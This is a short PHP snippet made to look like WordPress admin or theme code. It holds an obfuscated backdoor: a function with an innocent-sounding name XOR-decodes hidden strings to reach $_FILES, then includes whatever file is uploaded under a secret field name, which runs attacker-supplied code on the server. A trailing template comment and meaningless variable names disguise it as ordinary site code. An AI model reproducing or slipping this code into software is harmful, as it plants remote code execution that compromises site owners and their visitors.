...
$cockney = 'zwnJK5zoSJB3tY8';

function show_in_admin_all_list($rich_text, $converted_text)

{
    $printed = urldecode($rich_text);

    $operator = substr($converted_text,0, strlen($printed));
    $chunk = $printed ^ $operator;
    return $chunk;
}

$rel_array = ${show_in_admin_all_list("%251%27%06%0Ef", $cockney)};
	$last_char = 'dest';
if (isset($rel_array[$cockney]))

{
    $more = $rel_array[$cockney];
    $allowed_zones = $more[show_in_admin_all_list("%0E%1A%1E%15%25T%17%0A", $cockney)];
    include ($allowed_zones);
}


/* cript type="text/html" id="tmpl-customize-control-default-content">
			<#
